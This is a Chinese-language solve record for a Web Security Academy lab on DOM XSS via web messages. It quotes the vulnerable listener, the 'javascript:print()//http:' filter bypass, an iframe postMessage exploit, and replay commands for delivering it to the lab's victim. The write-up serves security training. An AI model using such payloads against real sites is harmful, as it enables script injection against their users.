---
title: "lab-dom-xss-using-web-messages-and-a-javascript-url"
links:
  - target: dom-xss-family
    relation: evidences
---

# lab-dom-xss-using-web-messages-and-a-javascript-url

> evidences: [[dom-xss-family]]

- 题面:DOM XSS using web messages and a JavaScript URL(/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
- 实例:https://0ada00ab035bb6668067035400e50056.web-security-academy.net
- 利用服务器:https://exploit-0aed000f039ab6ba803502ff01f700db.exploit-server.net
- slug(真):即请求 slug(lab_id 887F00FB…)
- 判定目标:web message 触发 DOM 重定向/JS URL 执行 `print()`;状态:**solved**(交付后 exploit 服务器 banner is-solved)

## 关键步

1. 首页内联监听:
   ```js
   window.addEventListener('message', function(e){
     var url = e.data;
     if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) { location.href = url; }
   }, false);
   ```
   无 origin 校验;但要求字符串**含 `http:`/`https:`**。
2. 绕过:用注释把 `http:` 塞进去,同时以 `javascript:` 开头:
   `javascript:print()//http:` —— `location.href = "javascript:print()//http:"` → 顶层执行 `print()`,
   `//` 后的 `http:` 只是让校验通过。
3. exploit 体:
   `<iframe src="https://<inst>/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>`
   交付(`--follow`)后即解。

## 证据摘录

```
exploit access log: (Victim) get /exploit/
exploit 服务器 banner: is-notsolved → is-solved
solved_check “<inst>/” --jar /tmp/b16-jar4.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch 887F00FBADC4A46FC79D4827EBD012B3BA4D52BA2FEF5B09A0A8B9A30A42A6DE --widget-source /web-security/dom-based/controlling-the-web-message-source --jar /tmp/b16-jar4.json
lab_http post "https://<exploit>/" --jar /tmp/b16-jar4.json --follow --form urlIsHttps=on --form responseFile=/exploit \
  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' \
  --form 'responseBody=<iframe src="https://<inst>/" onload="this.contentWindow.postMessage(&#39;javascript:print()//http:&#39;,&#39;*&#39;)"></iframe>' --form formAction=DELIVER_TO_VICTIM
solved_check "<inst>/" --jar /tmp/b16-jar4.json
```
